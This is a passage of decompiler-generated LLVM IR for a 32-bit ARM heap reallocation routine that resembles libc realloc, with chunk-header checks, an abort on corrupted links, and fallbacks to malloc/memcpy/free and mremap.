  %v1_2ce48 = add i32 %v0_2ce34, -8
  store i32 %v1_2ce48, i32* @sl, align 4
  %v1_2ce4c = and i32 %v3_2ce34, -4
  store i32 %v1_2ce4c, i32* @r6, align 4
  br i1 %v2_2ce44, label %dec_label_pc_2ce54, label %dec_label_pc_2d02c

dec_label_pc_2ce54:                               ; preds = %bb29
  %v1_2ce54 = load i32, i32* @sb, align 4
  %v3_2ce54 = icmp ult i32 %v1_2ce4c, %v1_2ce54
  br i1 %v3_2ce54, label %dec_label_pc_2ce60, label %bb30

bb30:                                             ; preds = %dec_label_pc_2ce54
  store i32 %v1_2ce4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2cfc4

dec_label_pc_2ce60:                               ; preds = %dec_label_pc_2ce54
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_2ce68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_2ce68, i32* %r0.global-to-local, align 4
  %v1_2ce6c = add i32 %v4_2ce68, 44
  %v2_2ce6c = inttoptr i32 %v1_2ce6c to i32*
  %v3_2ce6c = load i32, i32* %v2_2ce6c, align 4
  store i32 %v3_2ce6c, i32* %r3.global-to-local, align 4
  %v2_2ce70 = add i32 %v1_2ce4c, %v1_2ce48
  store i32 %v2_2ce70, i32* @r4, align 4
  %v9_2ce74 = icmp eq i32 %v2_2ce70, %v3_2ce6c
  %v1_2ce78 = add i32 %v2_2ce70, 4
  %v2_2ce78 = inttoptr i32 %v1_2ce78 to i32*
  %v3_2ce78 = load i32, i32* %v2_2ce78, align 4
  store i32 %v3_2ce78, i32* %r1.global-to-local, align 4
  br i1 %v9_2ce74, label %dec_label_pc_2ce80, label %dec_label_pc_2cebc

dec_label_pc_2ce80:                               ; preds = %dec_label_pc_2ce60
  %v1_2ce80 = and i32 %v3_2ce78, -4
  %v2_2ce84 = add i32 %v1_2ce80, %v1_2ce4c
  store i32 %v2_2ce84, i32* %r1.global-to-local, align 4
  %v1_2ce88 = add i32 %v1_2ce54, 16
  store i32 %v1_2ce88, i32* %r3.global-to-local, align 4
  %v3_2ce8c = icmp ult i32 %v2_2ce84, %v1_2ce88
  br i1 %v3_2ce8c, label %dec_label_pc_2cf10, label %dec_label_pc_2ce94

dec_label_pc_2ce94:                               ; preds = %dec_label_pc_2ce80
  %v2_2ce94 = sub i32 %v2_2ce84, %v1_2ce54
  %v1_2ce98 = urem i32 %v3_2ce34, 2
  %v2_2ce9c = add i32 %v1_2ce54, %v1_2ce48
  store i32 %v2_2ce9c, i32* %r1.global-to-local, align 4
  %v2_2cea0 = or i32 %v1_2ce54, %v1_2ce98
  store i32 %v2_2cea0, i32* %r2.global-to-local, align 4
  %v1_2cea4 = or i32 %v2_2ce94, 1
  store i32 %v1_2cea4, i32* %r3.global-to-local, align 4
  store i32 %v0_2ce34, i32* @r4, align 4
  store i32 %v2_2cea0, i32* %v2_2ce34, align 4
  %v0_2ceb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2ceb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_2ceb0 = add i32 %v1_2ceb0, 44
  %v3_2ceb0 = inttoptr i32 %v2_2ceb0 to i32*
  store i32 %v0_2ceb0, i32* %v3_2ceb0, align 4
  %v0_2ceb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_2ceb4 = load i32, i32* %r1.global-to-local, align 4
  %v2_2ceb4 = add i32 %v1_2ceb4, 4
  %v3_2ceb4 = inttoptr i32 %v2_2ceb4 to i32*
  store i32 %v0_2ceb4, i32* %v3_2ceb4, align 4
  br label %dec_label_pc_2d0f8

dec_label_pc_2cebc:                               ; preds = %dec_label_pc_2ce60
  %v1_2cebc = and i32 %v3_2ce78, -2
  %v2_2cec0 = add i32 %v1_2cebc, %v2_2ce70
  store i32 %v2_2cec0, i32* %r3.global-to-local, align 4
  %v1_2cec4 = add i32 %v2_2cec0, 4
  %v2_2cec4 = inttoptr i32 %v1_2cec4 to i32*
  %v3_2cec4 = load i32, i32* %v2_2cec4, align 4
  store i32 %v3_2cec4, i32* %r3.global-to-local, align 4
  %v1_2cec8 = urem i32 %v3_2cec4, 2
  %v2_2cec8 = icmp eq i32 %v1_2cec8, 0
  br i1 %v2_2cec8, label %dec_label_pc_2ced0, label %dec_label_pc_2cf10

dec_label_pc_2ced0:                               ; preds = %dec_label_pc_2cebc
  %v1_2ced0 = and i32 %v3_2ce78, -4
  store i32 %v1_2ced0, i32* %r3.global-to-local, align 4
  %v2_2ced4 = add i32 %v1_2ced0, %v1_2ce4c
  store i32 %v2_2ced4, i32* %r0.global-to-local, align 4
  %v3_2ced8 = icmp ult i32 %v2_2ced4, %v1_2ce54
  br i1 %v3_2ced8, label %dec_label_pc_2cf10, label %dec_label_pc_2cee0

dec_label_pc_2cee0:                               ; preds = %dec_label_pc_2ced0
  %v1_2cee0 = add i32 %v1_2ce4c, %v0_2ce34
  %v2_2cee0 = inttoptr i32 %v1_2cee0 to i32*
  %v3_2cee0 = load i32, i32* %v2_2cee0, align 4
  store i32 %v3_2cee0, i32* %r1.global-to-local, align 4
  %v1_2cee4 = add i32 %v3_2cee0, 12
  %v2_2cee4 = inttoptr i32 %v1_2cee4 to i32*
  %v3_2cee4 = load i32, i32* %v2_2cee4, align 4
  store i32 %v3_2cee4, i32* %r3.global-to-local, align 4
  %v9_2cee8 = icmp eq i32 %v3_2cee4, %v2_2ce70
  %v1_2ceec = add i32 %v2_2ce70, 12
  %v2_2ceec = inttoptr i32 %v1_2ceec to i32*
  %v3_2ceec = load i32, i32* %v2_2ceec, align 4
  store i32 %v3_2ceec, i32* %r2.global-to-local, align 4
  br i1 %v9_2cee8, label %dec_label_pc_2cef4, label %dec_label_pc_2cf00

dec_label_pc_2cef4:                               ; preds = %dec_label_pc_2cee0
  %v1_2cef4 = add i32 %v3_2ceec, 8
  %v2_2cef4 = inttoptr i32 %v1_2cef4 to i32*
  %v3_2cef4 = load i32, i32* %v2_2cef4, align 4
  store i32 %v3_2cef4, i32* %r3.global-to-local, align 4
  %v9_2cef8 = icmp eq i32 %v3_2cef4, %v2_2ce70
  br i1 %v9_2cef8, label %dec_label_pc_2cf04, label %dec_label_pc_2cf00

dec_label_pc_2cf00:                               ; preds = %dec_label_pc_2cee0, %dec_label_pc_2cef4
  %v0_2cf00 = call i32 @abort()
  store i32 %v0_2cf00, i32* %r0.global-to-local, align 4
  %v0_2cf04.pre = load i32, i32* @r1, align 4
  %v1_2cf04.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_2cf04

dec_label_pc_2cf04:                               ; preds = %dec_label_pc_2cef4, %dec_label_pc_2cf00
  %v1_2cf04 = phi i32 [ %v3_2ceec, %dec_label_pc_2cef4 ], [ %v1_2cf04.pre, %dec_label_pc_2cf00 ]
  %v0_2cf04 = phi i32 [ %v3_2cee0, %dec_label_pc_2cef4 ], [ %v0_2cf04.pre, %dec_label_pc_2cf00 ]
  %v2_2cf04 = add i32 %v1_2cf04, 8
  %v3_2cf04 = inttoptr i32 %v2_2cf04 to i32*
  store i32 %v0_2cf04, i32* %v3_2cf04, align 4
  %v0_2cf08 = load i32, i32* %r2.global-to-local, align 4
  %v1_2cf08 = load i32, i32* %r1.global-to-local, align 4
  %v2_2cf08 = add i32 %v1_2cf08, 12
  %v3_2cf08 = inttoptr i32 %v2_2cf08 to i32*
  store i32 %v0_2cf08, i32* %v3_2cf08, align 4
  %v1_2cfc4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2cfc4

dec_label_pc_2cf10:                               ; preds = %dec_label_pc_2ce80, %dec_label_pc_2ced0, %dec_label_pc_2cebc
  %v1_2cf10 = add i32 %v1_2ce54, -7
  store i32 %v1_2cf10, i32* %r0.global-to-local, align 4
  %v1_2cf14 = call i32 @malloc(i32 %v1_2cf10)
  store i32 %v1_2cf14, i32* @r0, align 4
  store i32 %v1_2cf14, i32* %r1.global-to-local, align 4
  %v2_2cf18 = icmp eq i32 %v1_2cf14, 0
  br i1 %v2_2cf18, label %bb31, label %dec_label_pc_2cf24

bb31:                                             ; preds = %dec_label_pc_2cf10
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_2d0f8

dec_label_pc_2cf24:                               ; preds = %dec_label_pc_2cf10
  %v1_2cf2c.pre = load i32, i32* @r4, align 4
  %v1_2cf24 = add i32 %v1_2cf14, -4
  %v2_2cf24 = inttoptr i32 %v1_2cf24 to i32*
  %v3_2cf24 = load i32, i32* %v2_2cf24, align 4
  store i32 %v3_2cf24, i32* @r3, align 4
  %v1_2cf28 = add i32 %v1_2cf14, -8
  store i32 %v1_2cf28, i32* @r7, align 4
  %v9_2cf2c = icmp eq i32 %v1_2cf28, %v1_2cf2c.pre
  br i1 %v9_2cf2c, label %.thread2, label %dec_label_pc_2cf3c

.thread2:                                         ; preds = %dec_label_pc_2cf24
  %v2_2cf30 = and i32 %v3_2cf24, -4
  store i32 %v2_2cf30, i32* %r3.global-to-local, align 4
  %v2_2cf34 = load i32, i32* @r6, align 4
  %v3_2cf34 = add i32 %v2_2cf34, %v2_2cf30
  store i32 %v3_2cf34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2cfc4

dec_label_pc_2cf3c:                               ; preds = %dec_label_pc_2cf24
  %v0_2cf3c = load i32, i32* @r6, align 4
  %v1_2cf3c = add i32 %v0_2cf3c, -4
  store i32 %v1_2cf3c, i32* @r2, align 4
  %v3_2cf40 = udiv i32 %v1_2cf3c, 4
  store i32 %v3_2cf40, i32* @ip, align 4
  %tmp37 = and i32 %v1_2cf3c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_2cf48 = icmp ult i32 %v1_2cf3c, 36
  %v3_2cf48 = or i1 %tmp38, %v2_2cf48
  %v0_2cf58 = load i32, i32* @r5, align 4
  br i1 %v3_2cf48, label %dec_label_pc_2cf58, label %dec_label_pc_2cf4c

dec_label_pc_2cf4c:                               ; preds = %dec_label_pc_2cf3c
  store i32 %v0_2cf58, i32* @r1, align 4
  %v0_2cf50 = call i32 @memcpy()
  store i32 %v0_2cf50, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_2cf58:                               ; preds = %dec_label_pc_2cf3c
  %v1_2cf58 = inttoptr i32 %v0_2cf58 to i32*
  %v2_2cf58 = load i32, i32* %v1_2cf58, align 4
  store i32 %v2_2cf58, i32* %r3.global-to-local, align 4
  %v2_2cf5c = inttoptr i32 %v1_2cf14 to i32*
  store i32 %v2_2cf58, i32* %v2_2cf5c, align 4
  %v0_2cf60 = load i32, i32* @r5, align 4
  %v1_2cf60 = add i32 %v0_2cf60, 4
  %v2_2cf60 = inttoptr i32 %v1_2cf60 to i32*
  %v3_2cf60 = load i32, i32* %v2_2cf60, align 4
  store i32 %v3_2cf60, i32* %r3.global-to-local, align 4
  %v1_2cf64 = load i32, i32* %r1.global-to-local, align 4
  %v2_2cf64 = add i32 %v1_2cf64, 4
  %v3_2cf64 = inttoptr i32 %v2_2cf64 to i32*
  store i32 %v3_2cf60, i32* %v3_2cf64, align 4
  %v0_2cf68 = load i32, i32* @r5, align 4
  %v1_2cf68 = add i32 %v0_2cf68, 8
  %v2_2cf68 = inttoptr i32 %v1_2cf68 to i32*
  %v3_2cf68 = load i32, i32* %v2_2cf68, align 4
  store i32 %v3_2cf68, i32* %r3.global-to-local, align 4
  %v0_2cf6c = load i32, i32* @ip, align 4
  %v1_2cf70 = load i32, i32* %r1.global-to-local, align 4
  %v2_2cf70 = add i32 %v1_2cf70, 8
  %v3_2cf70 = inttoptr i32 %v2_2cf70 to i32*
  store i32 %v3_2cf68, i32* %v3_2cf70, align 4
  %tmp39 = icmp ult i32 %v0_2cf6c, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_2cf78

dec_label_pc_2cf78:                               ; preds = %dec_label_pc_2cf58
  %v0_2cf78 = load i32, i32* @r5, align 4
  %v1_2cf78 = add i32 %v0_2cf78, 12
  %v2_2cf78 = inttoptr i32 %v1_2cf78 to i32*
  %v3_2cf78 = load i32, i32* %v2_2cf78, align 4
  store i32 %v3_2cf78, i32* %r3.global-to-local, align 4
  %v1_2cf7c = load i32, i32* %r1.global-to-local, align 4
  %v2_2cf7c = add i32 %v1_2cf7c, 12
  %v3_2cf7c = inttoptr i32 %v2_2cf7c to i32*
  store i32 %v3_2cf78, i32* %v3_2cf7c, align 4
  %v0_2cf80 = load i32, i32* @r5, align 4
  %v1_2cf80 = add i32 %v0_2cf80, 16
  %v2_2cf80 = inttoptr i32 %v1_2cf80 to i32*
  %v3_2cf80 = load i32, i32* %v2_2cf80, align 4
  store i32 %v3_2cf80, i32* %r3.global-to-local, align 4
  %v0_2cf84 = load i32, i32* @ip, align 4
  %v1_2cf88 = load i32, i32* %r1.global-to-local, align 4
  %v2_2cf88 = add i32 %v1_2cf88, 16
  %v3_2cf88 = inttoptr i32 %v2_2cf88 to i32*
  store i32 %v3_2cf80, i32* %v3_2cf88, align 4
  %tmp40 = icmp ult i32 %v0_2cf84, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_2cf90

dec_label_pc_2cf90:                               ; preds = %dec_label_pc_2cf78
  %v0_2cf90 = load i32, i32* @r5, align 4
  %v1_2cf90 = add i32 %v0_2cf90, 20
  %v2_2cf90 = inttoptr i32 %v1_2cf90 to i32*
  %v3_2cf90 = load i32, i32* %v2_2cf90, align 4
  store i32 %v3_2cf90, i32* %r3.global-to-local, align 4
  %v1_2cf94 = load i32, i32* %r1.global-to-local, align 4
  %v2_2cf94 = add i32 %v1_2cf94, 20
  %v3_2cf94 = inttoptr i32 %v2_2cf94 to i32*
  store i32 %v3_2cf90, i32* %v3_2cf94, align 4
  %v0_2cf98 = load i32, i32* @r5, align 4
  %v1_2cf98 = add i32 %v0_2cf98, 24
  %v2_2cf98 = inttoptr i32 %v1_2cf98 to i32*
  %v3_2cf98 = load i32, i32* %v2_2cf98, align 4
  store i32 %v3_2cf98, i32* %r3.global-to-local, align 4
  %v1_2cf9c = load i32, i32* %r1.global-to-local, align 4
  %v2_2cf9c = add i32 %v1_2cf9c, 24
  %v3_2cf9c = inttoptr i32 %v2_2cf9c to i32*
  store i32 %v3_2cf98, i32* %v3_2cf9c, align 4
  %v0_2cfa0 = load i32, i32* @ip, align 4
  %v7_2cfa0 = icmp eq i32 %v0_2cfa0, 9
  br i1 %v7_2cfa0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_2cf90
  %v1_2cfa4 = load i32, i32* @r5, align 4
  %v2_2cfa4 = add i32 %v1_2cfa4, 28
  %v3_2cfa4 = inttoptr i32 %v2_2cfa4 to i32*
  %v4_2cfa4 = load i32, i32* %v3_2cfa4, align 4
  store i32 %v4_2cfa4, i32* %r3.global-to-local, align 4
  %v2_2cfa8 = load i32, i32* %r1.global-to-local, align 4
  %v3_2cfa8 = add i32 %v2_2cfa8, 28
  %v4_2cfa8 = inttoptr i32 %v3_2cfa8 to i32*
  store i32 %v4_2cfa4, i32* %v4_2cfa8, align 4
  %v1_2cfac = load i32, i32* @r5, align 4
  %v2_2cfac = add i32 %v1_2cfac, 32
  %v3_2cfac = inttoptr i32 %v2_2cfac to i32*
  %v4_2cfac = load i32, i32* %v3_2cfac, align 4
  store i32 %v4_2cfac, i32* %r3.global-to-local, align 4
  %v2_2cfb0 = load i32, i32* %r1.global-to-local, align 4
  %v3_2cfb0 = add i32 %v2_2cfb0, 32
  %v4_2cfb0 = inttoptr i32 %v3_2cfb0 to i32*
  store i32 %v4_2cfac, i32* %v4_2cfb0, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_2cf90, %dec_label_pc_2cf78, %dec_label_pc_2cf58, %dec_label_pc_2cf4c, %bb32
  %v0_2cfb4 = load i32, i32* @r5, align 4
  store i32 %v0_2cfb4, i32* @r0, align 4
  %v0_2cfb8 = call i32 @free()
  store i32 %v0_2cfb8, i32* %r0.global-to-local, align 4
  %v0_2cfbc = load i32, i32* @r7, align 4
  %v1_2cfbc = add i32 %v0_2cfbc, 8
  store i32 %v1_2cfbc, i32* @r4, align 4
  br label %dec_label_pc_2d0f8

dec_label_pc_2cfc4:                               ; preds = %bb30, %.thread2, %dec_label_pc_2cf04
  %v0_2cfd8 = phi i32 [ %v3_2cf34, %.thread2 ], [ %v1_2ce4c, %bb30 ], [ %v1_2cfc4.pre, %dec_label_pc_2cf04 ]
  %v0_2cfc4 = load i32, i32* @sb, align 4
  %v2_2cfc4 = sub i32 %v0_2cfd8, %v0_2cfc4
  store i32 %v2_2cfc4, i32* %r1.global-to-local, align 4
  %v0_2cfcc = load i32, i32* @sl, align 4
  %v1_2cfcc = add i32 %v0_2cfcc, 4
  %v2_2cfcc = inttoptr i32 %v1_2cfcc to i32*
  %v3_2cfcc = load i32, i32* %v2_2cfcc, align 4
  %tmp41 = icmp ugt i32 %v2_2cfc4, 15
  %v1_2cff4 = urem i32 %v3_2cfcc, 2
  store i32 %v1_2cff4, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_2cff4, label %dec_label_pc_2cfd4

dec_label_pc_2cfd4:                               ; preds = %dec_label_pc_2cfc4
  %v2_2cfd8 = or i32 %v1_2cff4, %v0_2cfd8
  store i32 %v2_2cfd8, i32* %r3.global-to-local, align 4
  store i32 %v2_2cfd8, i32* %v2_2cfcc, align 4
  %v0_2cfe0 = load i32, i32* @sl, align 4
  %v1_2cfe0 = load i32, i32* %r0.global-to-local, align 4
  %v2_2cfe0 = add i32 %v1_2cfe0, %v0_2cfe0
  store i32 %v2_2cfe0, i32* %r2.global-to-local, align 4
  %v1_2cfe4 = add i32 %v2_2cfe0, 4
  %v2_2cfe4 = inttoptr i32 %v1_2cfe4 to i32*
  %v3_2cfe4 = load i32, i32* %v2_2cfe4, align 4
  %v1_2cfe8 = or i32 %v3_2cfe4, 1
  store i32 %v1_2cfe8, i32* %r3.global-to-local, align 4
  store i32 %v1_2cfe8, i32* %v2_2cfe4, align 4
  br label %dec_label_pc_2d024

dec_label_pc_2cff4:                               ; preds = %dec_label_pc_2cfc4
  %v2_2cff8 = add i32 %v0_2cfcc, %v0_2cfc4
  store i32 %v2_2cff8, i32* %r0.global-to-local, align 4
  %v2_2cffc = or i32 %v1_2cff4, %v0_2cfc4
  store i32 %v2_2cffc, i32* %r3.global-to-local, align 4
  %v1_2d000 = or i32 %v2_2cfc4, 1
  store i32 %v1_2d000, i32* %r2.global-to-local, align 4
  store i32 %v2_2cffc, i32* %v2_2cfcc, align 4
  %v0_2d008 = load i32, i32* %r2.global-to-local, align 4
  %v1_2d008 = load i32, i32* %r0.global-to-local, align 4
  %v2_2d008 = add i32 %v1_2d008, 4
  %v3_2d008 = inttoptr i32 %v2_2d008 to i32*
  store i32 %v0_2d008, i32* %v3_2d008, align 4
  %v0_2d00c = load i32, i32* %r0.global-to-local, align 4
  %v1_2d00c = load i32, i32* %r1.global-to-local, align 4
  %v2_2d00c = add i32 %v1_2d00c, %v0_2d00c
  store i32 %v2_2d00c, i32* %r2.global-to-local, align 4
  %v1_2d010 = add i32 %v2_2d00c, 4
  %v2_2d010 = inttoptr i32 %v1_2d010 to i32*
  %v3_2d010 = load i32, i32* %v2_2d010, align 4
  %v1_2d014 = or i32 %v3_2d010, 1
  store i32 %v1_2d014, i32* %r3.global-to-local, align 4
  store i32 %v1_2d014, i32* %v2_2d010, align 4
  %v0_2d01c = load i32, i32* %r0.global-to-local, align 4
  %v1_2d01c = add i32 %v0_2d01c, 8
  store i32 %v1_2d01c, i32* @r0, align 4
  %v0_2d020 = call i32 @free()
  store i32 %v0_2d020, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2d024

dec_label_pc_2d024:                               ; preds = %dec_label_pc_2cfd4, %dec_label_pc_2cff4
  %v0_2d024 = load i32, i32* @sl, align 4
  %v1_2d024 = add i32 %v0_2d024, 8
  store i32 %v1_2d024, i32* @r4, align 4
  br label %dec_label_pc_2d0f8

dec_label_pc_2d02c:                               ; preds = %bb29
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r1.global-to-local, align 4
  %v4_2d034 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_2d034, i32* @r8, align 4
  %v2_2d038 = inttoptr i32 %v1_2ce48 to i32*
  %v3_2d038 = load i32, i32* %v2_2d038, align 4
  store i32 %v3_2d038, i32* @r4, align 4
  %v1_2d03c = add i32 %v4_2d034, 860
  %v2_2d03c = inttoptr i32 %v1_2d03c to i32*
  %v3_2d03c = load i32, i32* %v2_2d03c, align 4
  %v1_2d040 = add i32 %v3_2d038, 4
  %v1_2d044 = add i32 %v3_2d03c, -1
  store i32 %v1_2d044, i32* %r2.global-to-local, align 4
  %v2_2d048 = add i32 %v1_2d040, %v1_2d044
  %v1_2d04c = load i32, i32* @sb, align 4
  %v2_2d04c = add i32 %v2_2d048, %v1_2d04c
  store i32 %v2_2d04c, i32* %r3.global-to-local, align 4
  %v2_2d050 = sub i32 0, %v3_2d03c
  %v3_2d050 = and i32 %v2_2d04c, %v2_2d050
  store i32 %v3_2d050, i32* @r7, align 4
  %v2_2d054 = sub i32 %v3_2d050, %v3_2d038
  store i32 %v2_2d054, i32* @fp, align 4
  %v9_2d058 = icmp eq i32 %v1_2ce4c, %v2_2d054
  br i1 %v9_2d058, label %dec_label_pc_2d0cc, label %dec_label_pc_2d060

dec_label_pc_2d060:                               ; preds = %dec_label_pc_2d02c
  %v2_2d060 = sub i32 %v1_2ce48, %v3_2d038
  store i32 %v2_2d060, i32* %r0.global-to-local, align 4
  %v2_2d064 = add i32 %v3_2d038, %v1_2ce4c
  store i32 %v2_2d064, i32* %r1.global-to-local, align 4
  store i32 %v3_2d050, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_2d070 = call i32 @mremap(i32 %v2_2d060, i32 %v2_2d064, i32 %v3_2d050, i32 1)
  store i32 %v4_2d070, i32* %r0.global-to-local, align 4
  %v7_2d074 = icmp eq i32 %v4_2d070, -1
  br i1 %v7_2d074, label %dec_label_pc_2d0c0, label %dec_label_pc_2d07c

dec_label_pc_2d07c:                               ; preds = %dec_label_pc_2d060
  %v1_2d07c = load i32, i32* @r4, align 4
  %v2_2d07c = add i32 %v1_2d07c, %v4_2d070
  store i32 %v2_2d07c, i32* %r0.global-to-local, align 4
  %v0_2d080 = load i32, i32* @fp, align 4
  %v1_2d080 = or i32 %v0_2d080, 2
  store i32 %v1_2d080, i32* %r3.global-to-local, align 4
  %v2_2d084 = add i32 %v2_2d07c, 4
  %v3_2d084 = inttoptr i32 %v2_2d084 to i32*
  store i32 %v1_2d080, i32* %v3_2d084, align 4
  %v0_2d088 = load i32, i32* @r8, align 4
  %v1_2d088 = add i32 %v0_2d088, 868
  %v2_2d088 = inttoptr i32 %v1_2d088 to i32*
  %v3_2d088 = load i32, i32* %v2_2d088, align 4
  store i32 %v3_2d088, i32* %r3.global-to-local, align 4
  %v1_2d08c = add i32 %v0_2d088, 880
  %v2_2d08c = inttoptr i32 %v1_2d08c to i32*
  %v3_2d08c = load i32, i32* %v2_2d08c, align 4
  store i32 %v3_2d08c, i32* %r2.global-to-local, align 4
  %v0_2d090 = load i32, i32* @r6, align 4
  %v2_2d090 = sub i32 %v3_2d088, %v0_2d090
  store i32 %v2_2d090, i32* %r3.global-to-local, align 4
  %v1_2d094 = load i32, i32* @r7, align 4
  %v2_2d094 = add i32 %v1_2d094, %v2_2d090
  store i32 %v2_2d094, i32* %r1.global-to-local, align 4
  %v1_2d098 = add i32 %v0_2d088, 872
  %v2_2d098 = inttoptr i32 %v1_2d098 to i32*
  %v3_2d098 = load i32, i32* %v2_2d098, align 4
  store i32 %v3_2d098, i32* %r3.global-to-local, align 4
  %v1_2d0a0 = add i32 %v0_2d088, 884
  %v2_2d0a0 = inttoptr i32 %v1_2d0a0 to i32*
  %v3_2d0a0 = load i32, i32* %v2_2d0a0, align 4
  store i32 %v3_2d0a0, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_2d094, %v3_2d08c
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_2d07c
  store i32 %v2_2d094, i32* %v2_2d08c, align 4
  %v0_2d0a8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_2d0a8.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_2d07c, %bb33
  %v1_2d0a8 = phi i32 [ %v0_2d088, %dec_label_pc_2d07c ], [ %v1_2d0a8.pre, %bb33 ]
  %v0_2d0a8 = phi i32 [ %v2_2d094, %dec_label_pc_2d07c ], [ %v0_2d0a8.pre, %bb33 ]
  %v2_2d0a8 = add i32 %v1_2d0a8, 868
  %v3_2d0a8 = inttoptr i32 %v2_2d0a8 to i32*
  store i32 %v0_2d0a8, i32* %v3_2d0a8, align 4
  %v0_2d0ac = load i32, i32* %r1.global-to-local, align 4
  %v1_2d0ac = load i32, i32* %r3.global-to-local, align 4
  %v2_2d0ac = add i32 %v1_2d0ac, %v0_2d0ac
  store i32 %v2_2d0ac, i32* %r1.global-to-local, align 4
  %v1_2d0b0 = load i32, i32* %r2.global-to-local, align 4
  %v0_2d0b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_2d0b4 = add i32 %v0_2d0b4, 8
  store i32 %v1_2d0b4, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_2d0ac, %v1_2d0b0
  br i1 %tmp43, label %bb35, label %dec_label_pc_2d0f8

bb35:                                             ; preds = %bb34
  %v5_2d0b8 = load i32, i32* @r8, align 4
  %v6_2d0b8 = add i32 %v5_2d0b8, 884
  %v7_2d0b8 = inttoptr i32 %v6_2d0b8 to i32*
  store i32 %v2_2d0ac, i32* %v7_2d0b8, align 4
  br label %dec_label_pc_2d0f8

dec_label_pc_2d0c0:                               ; preds = %dec_label_pc_2d060
  %v0_2d0c0 = load i32, i32* @sb, align 4
  %v1_2d0c0 = add i32 %v0_2d0c0, 4
  store i32 %v1_2d0c0, i32* %r3.global-to-local, align 4
  %v0_2d0c4 = load i32, i32* @r6, align 4
  %v3_2d0c4 = icmp ult i32 %v0_2d0c4, %v1_2d0c0
  br i1 %v3_2d0c4, label %dec_label_pc_2d0d4, label %dec_label_pc_2d0c0.dec_label_pc_2d0cc_crit_edge

dec_label_pc_2d0c0.dec_label_pc_2d0cc_crit_edge:  ; preds = %dec_label_pc_2d0c0
  %v0_2d0cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2d0cc

dec_label_pc_2d0cc:                               ; preds = %dec_label_pc_2d0c0.dec_label_pc_2d0cc_crit_edge, %dec_label_pc_2d02c
  %v0_2d0cc = phi i32 [ %v0_2d0cc.pre, %dec_label_pc_2d0c0.dec_label_pc_2d0cc_crit_edge ], [ %v0_2ce34, %dec_label_pc_2d02c ]
  store i32 %v0_2d0cc, i32* @r4, align 4
  br label %dec_label_pc_2d0f8

dec_label_pc_2d0d4:                               ; preds = %dec_label_pc_2d0c0
  %v1_2d0d4 = add i32 %v0_2d0c0, -7
  store i32 %v1_2d0d4, i32* %r0.global-to-local, align 4
  %v1_2d0d8 = call i32 @malloc(i32 %v1_2d0d4)
  store i32 %v1_2d0d8, i32* @r0, align 4
  store i32 %v1_2d0d8, i32* @r4, align 4
  %v2_2d0dc = icmp eq i32 %v1_2d0d8, 0
  br i1 %v2_2d0dc, label %dec_label_pc_2d0f8, label %dec_label_pc_2d0e4

dec_label_pc_2d0e4:                               ; preds = %dec_label_pc_2d0d4
  %v0_2d0e4 = load i32, i32* @r6, align 4
  %v1_2d0e4 = add i32 %v0_2d0e4, -8
  store i32 %v1_2d0e4, i32* @r2, align 4
  %v0_2d0e8 = load i32, i32* @r5, align 4
  store i32 %v0_2d0e8, i32* @r1, align 4
  %v0_2d0ec = call i32 @memcpy()
  %v0_2d0f0 = load i32, i32* @r5, align 4
  store i32 %v0_2d0f0, i32* @r0, align 4
  %v0_2d0f4 = call i32 @free()
  store i32 %v0_2d0f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2d0f8

dec_label_pc_2d0f8:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_2d0d4, %dec_label_pc_2d0cc, %dec_label_pc_2d024, %.thread6, %dec_label_pc_2ce94, %dec_label_pc_2d0e4
  store i32 %v2_2cde0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  %v4_2d108 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 52) to i32*), align 4
  store i32 %v4_2d108, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_2d108)
  br label %dec_label_pc_2d114

dec_label_pc_2d114:                               ; preds = %dec_label_pc_2ce14, %dec_label_pc_2cdbc, %dec_label_pc_2cda4, %dec_label_pc_2d0f8
  %v0_2d114 = load i32, i32* @r4, align 4
  store i32 %v0_2d114, i32* %r0.global-to-local, align 4
  store i32 %v3_2cd84, i32* @r4, align 4
  store i32 %v6_2cd84, i32* @r5, align 4
  store i32 %v9_2cd84, i32* @r6, align 4
  store i32 %v12_2cd84, i32* @r7, align 4
  store i32 %v15_2cd84, i32* @r8, align 4
  store i32 %v18_2cd84, i32* @sb, align 4
  store i32 %v21_2cd84, i32* @sl, align 4
  store i32 %v24_2cd84, i32* @fp, align 4
  store i32 %v27_2cd84, i32* @lr, align 4
  ret i32 %v0_2d114

